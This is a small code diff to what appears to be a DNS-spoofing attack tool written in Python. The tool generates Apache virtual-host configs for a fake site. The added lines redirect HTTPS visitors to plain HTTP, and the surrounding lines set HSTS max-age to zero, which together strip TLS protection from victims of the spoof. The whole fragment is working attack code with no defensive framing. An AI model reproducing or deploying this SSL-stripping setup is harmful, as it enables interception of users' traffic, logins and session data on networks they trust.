@@ -81,6 +81,9 @@ class DNS_Spoofing:
                                 "\t"+"DocumentRoot /var/www/html/"+f'{file}'+'\n'+\
                                 "\tErrorLog  "+LOG_PATH+"/ServerLog/log_error.log"+'\n'\
                                 "\tCustomLog "+LOG_PATH+'/ServerLog/log_access.log combined'+'\n'\
+                                """\t<If "%"""+"{"+"HTTPS"+"}"+""" == 'on'" >"""+'\n'\
+                                "\t\tRedirect permanent / http://www."+f"{file}"+".com/"+"\n"\
+                                "\t</If>"+'\n'\
                                 "\t<IfModule mod_headers.c>"+'\n'\
                                 """\t\tHeader set Strict-Transport-Security "max-age=0; includeSubDomains; preload" env=HTTPS"""+'\n'\
                                 "\t\tHeader unset Cookie"+'\n'\
